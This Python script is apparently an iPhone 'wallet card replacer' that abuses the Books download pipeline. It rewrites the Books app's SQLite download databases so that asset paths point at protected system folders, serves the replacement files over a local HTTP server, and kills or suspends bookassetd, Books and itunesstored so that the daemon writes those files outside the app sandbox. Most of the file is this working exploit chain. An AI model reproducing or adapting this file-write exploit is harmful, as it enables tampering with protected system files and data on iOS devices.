import platform
import sys
import traceback
import subprocess
import atexit
import concurrent
import os
import posixpath
import queue
import socket
import sqlite3
import shutil
import time
import threading
import functools
from pathlib import Path
from threading import Timer
from http.server import HTTPServer, SimpleHTTPRequestHandler

import asyncio
import click
import requests
from packaging.version import parse as parse_version
from pymobiledevice3 import usbmux
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception, DeviceNotFoundError
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.lockdown_service_provider import LockdownServiceProvider
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.services.dvt.dvt_secure_socket_proxy import DvtSecureSocketProxyService
from pymobiledevice3.tunneld.api import async_get_tunneld_devices
from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl

LOCAL_SOURCE_FOLDER = "Cards"
BASE_REMOTE_PATH = "/private/var/mobile/Library/Passes/Cards"

TARGET_DISCLOSURE_PATH = "" 
sd_file = "" 
RESPRING_ENABLED = False
GLOBAL_TIMEOUT_SECONDS = 3600

audio_head_ok = threading.Event()
audio_get_ok = threading.Event()

class AudioRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        super().log_request(code, size)
        try:
            code_int = int(code)
        except Exception:
            code_int = 0

        target_path = "/" + os.path.basename(sd_file)

        if code_int == 200 and self.path == target_path:
            if self.command == "HEAD":
                audio_head_ok.set()
            elif self.command == "GET":
                audio_get_ok.set()

def get_uuid_from_tracev2_after_reboot(service_provider: LockdownClient):
    click.secho("Listening to tracev2 logs to get UUID...", fg="yellow")
    try:
        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
            if posixpath.basename(syslog_entry.filename) == 'bookassetd':
                message = syslog_entry.message
                if "/var/containers/Shared/SystemGroup/" in message:
                    try:
                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1].split("/")[0]
                        if len(uuid) >= 10 and not uuid.startswith("systemgroup.com.apple"):
                            click.secho(f"Found UUID: {uuid}", fg="green")
                            with open("uuid.txt", "w") as f: f.write(uuid)
                            return uuid
                    except: continue
                if "/Documents/BLDownloads/" in message:
                    try:
                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1].split("/Documents/BLDownloads")[0]
                        if len(uuid) >= 10:
                            click.secho(f"Found UUID: {uuid}", fg="green")
                            with open("uuid.txt", "w") as f: f.write(uuid)
                            return uuid
                    except: continue
    except Exception as e:
        click.secho(f"Error reading logs: {e}", fg="red")
    return None

def reboot_and_get_uuid(service_provider: LockdownClient, udid: str):
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    uuid_path = os.path.join(script_dir, "uuid.txt")
    
    if os.path.exists(uuid_path):
        click.secho(f"Using saved UUID: {open(uuid_path).read().strip()}", fg="green")
        return open(uuid_path).read().strip(), service_provider

    click.secho("UUID not found. Please open Books app and download a book.", fg="yellow")
    max_wait = 120
    elapsed = 0
    while elapsed < max_wait:
        time.sleep(2)
        elapsed += 2
        try:
            sp = create_using_usbmux(serial=udid)
            uuid = get_uuid_from_tracev2_after_reboot(sp)
            if uuid: return uuid, sp
        except: continue
    return None, None

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    finally: s.close()

def start_http_server():
    handler = functools.partial(AudioRequestHandler)
    httpd = HTTPServer(("0.0.0.0", 0), handler)
    info_queue.put((get_lan_ip(), httpd.server_port))
    httpd.serve_forever()

def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService, uuid: str = None):
    global audio_head_ok, audio_get_ok
    audio_head_ok.clear()
    audio_get_ok.clear()

    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    ip, port = info_queue.get()
    print(f"Server started: http://{ip}:{port}/")

    filename_only = os.path.basename(sd_file)
    audio_url = f"http://{ip}:{port}/{filename_only}"

    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    try:
        shutil.copy(os.path.join(script_dir, "BLDatabaseManager.sqlite"), "BLDatabaseManager.sqlite")
        shutil.copy(os.path.join(script_dir, "downloads.28.sqlitedb"), "downloads.28.sqlitedb")
    except: pass

    with sqlite3.connect("BLDatabaseManager.sqlite") as bldb_conn:
        c = bldb_conn.cursor()
        c.execute("UPDATE ZBLDOWNLOADINFO SET ZASSETPATH=?, ZPLISTPATH=?, ZDOWNLOADID=?", (TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH))
        c.execute("UPDATE ZBLDOWNLOADINFO SET ZURL=?", (audio_url,))
        bldb_conn.commit()
    
    click.secho(f"Target: {TARGET_DISCLOSURE_PATH}", fg="blue")

    afc = AfcService(lockdown=service_provider)
    pc = ProcessControl(dvt)

    if not uuid: uuid = open("uuid.txt", "r").read().strip()

    shutil.copyfile("downloads.28.sqlitedb", "tmp.downloads.28.sqlitedb")
    with sqlite3.connect("tmp.downloads.28.sqlitedb") as conn:
        c = conn.cursor()
        local_p = f"/private/var/containers/Shared/SystemGroup/{uuid}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
        server_p = f"http://{ip}:{port}/BLDatabaseManager.sqlite"
        c.execute(f"UPDATE asset SET local_path = CASE WHEN local_path LIKE '%/BLDatabaseManager.sqlite' THEN '{local_p}' WHEN local_path LIKE '%/BLDatabaseManager.sqlite-shm' THEN '{local_p}-shm' WHEN local_path LIKE '%/BLDatabaseManager.sqlite-wal' THEN '{local_p}-wal' END WHERE local_path LIKE '/private/var/containers/Shared/SystemGroup/%/Documents/BLDatabaseManager/BLDatabaseManager.sqlite%'")
        c.execute(f"UPDATE asset SET url = CASE WHEN url LIKE '%/BLDatabaseManager.sqlite' THEN '{server_p}' WHEN url LIKE '%/BLDatabaseManager.sqlite-shm' THEN '{server_p}-shm' WHEN url LIKE '%/BLDatabaseManager.sqlite-wal' THEN '{server_p}-wal' END WHERE url LIKE '%/BLDatabaseManager.sqlite%'")
        conn.commit()

    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    for p in ['bookassetd', 'Books']:
        pid = next((pid for pid, pr in procs.items() if pr['ProcessName'] == p), None)
        if pid: 
            try: pc.signal(pid, 19) if p == 'bookassetd' else pc.kill(pid)
            except: pass

    click.secho(f"Uploading content: {filename_only}", fg="yellow")
    AfcService(lockdown=service_provider).push(sd_file, filename_only)

    afc.push("tmp.downloads.28.sqlitedb", "Downloads/downloads.28.sqlitedb")
    afc.push("tmp.downloads.28.sqlitedb-shm", "Downloads/downloads.28.sqlitedb-shm")
    afc.push("tmp.downloads.28.sqlitedb-wal", "Downloads/downloads.28.sqlitedb-wal")

    pid_itunes = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
    if pid_itunes: pc.kill(pid_itunes)

    time.sleep(3)

    for p in ['bookassetd', 'Books']:
        pid = next((pid for pid, p in procs.items() if p['ProcessName'] == p), None)
        if pid: 
            try: pc.kill(pid)
            except: pass

    try: pc.launch("com.apple.iBooks")
    except: pass

    start = time.time()
    while True:
        if audio_get_ok.is_set():
            click.secho(" [OK] Success.", fg="green")
            break
        if time.time() - start > 45:
            click.secho(" [!] Timeout.", fg="red")
            break
        time.sleep(0.1)

    pid_book = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    if pid_book: pc.kill(pid_book)

    if RESPRING_ENABLED:
        click.secho("Respringing...", fg="green")
        pid_sb = next((pid for pid, p in procs.items() if p['ProcessName'] == 'SpringBoard'), None)
        if pid_sb: pc.kill(pid_sb)

def exit_func(p): p.terminate()
async def create_tunnel(udid):
    cmd = f"sudo python3 -m pymobiledevice3 lockdown start-tunnel --script-mode --udid {udid}"
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    atexit.register(exit_func, p)
    while True:
        line = p.stdout.readline()
        if line: return {"address": line.decode().split(" ")[0], "port": int(line.decode().split(" ")[1])}

async def connection_context(udid):
    try:
        sp = create_using_usbmux(serial=udid)
        ver = parse_version(sp.product_version)
        uuid, sp = reboot_and_get_uuid(sp, udid)
        if not sp: return

        if ver >= parse_version('17.0'):
            addr = await create_tunnel(udid)
            if addr:
                async with RemoteServiceDiscoveryService((addr["address"], addr["port"])) as rsd:
                    with DvtSecureSocketProxyService(rsd) as dvt: main_callback(rsd, dvt, uuid)
        else:
            with DvtSecureSocketProxyService(lockdown=sp) as dvt: main_callback(sp, dvt, uuid)
    except Exception as e:
        click.secho(f"Connection error: {e}", fg="red")

def get_default_udid() -> str:
    devs = list(usbmux.list_devices())
    if not devs: raise NoDeviceConnectedError()
    return devs[0].serial

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    info_queue = queue.Queue()

    if not os.path.exists(LOCAL_SOURCE_FOLDER):
        click.secho(f"[-] Folder '{LOCAL_SOURCE_FOLDER}' not found.", fg="red")
        click.secho(f"    Please create a folder named '{LOCAL_SOURCE_FOLDER}' and place the 4 files inside.", fg="red")
        sys.exit(1)

    try:
        if len(sys.argv) > 1: udid = sys.argv[1]
        else: udid = get_default_udid()
        click.secho(f"[*] Device: {udid}", fg="green")
    except:
        click.secho("[-] No device found.", fg="red")
        sys.exit(1)

    print("\n--- WALLET CARD REPLACER TOOL ---")
    card_id = input("Enter Card ID (e.g., T1DyR...): ").strip()
    if not card_id:
        print("Card ID cannot be empty.")
        sys.exit(1)

    tasks = [
        ("cardBackgroundCombined@2x.png", f"{card_id}.pkpass/cardBackgroundCombined@2x.png"),
        ("FrontFace",  f"{card_id}.cache/FrontFace"),
        ("PlaceHolder", f"{card_id}.cache/PlaceHolder"),
        ("Preview",    f"{card_id}.cache/Preview")
    ]

    print(f"\n[*] Starting process for card: {card_id}\n")

    for index, (filename, subpath) in enumerate(tasks):
        local_path = os.path.join(LOCAL_SOURCE_FOLDER, filename)
        
        if not os.path.exists(local_path):
            click.secho(f"[SKIP] File '{filename}' not found in Cards folder.", fg="yellow")
            continue

        sd_file = filename
        shutil.copy(local_path, sd_file)

        TARGET_DISCLOSURE_PATH = f"{BASE_REMOTE_PATH}/{subpath}"
        
        RESPRING_ENABLED = (index == len(tasks) - 1)

        click.secho(f"[{index+1}/{len(tasks)}] Processing: {filename}", fg="magenta")

        try:
            asyncio.run(connection_context(udid))
        except Exception as e:
            click.secho(f"Error: {e}", fg="red")

        if os.path.exists(sd_file): os.remove(sd_file)

    click.secho("\n[DONE] Process Completed!", fg="green")
    click.secho("YangJiii - @duongduong0908", fg="cyan")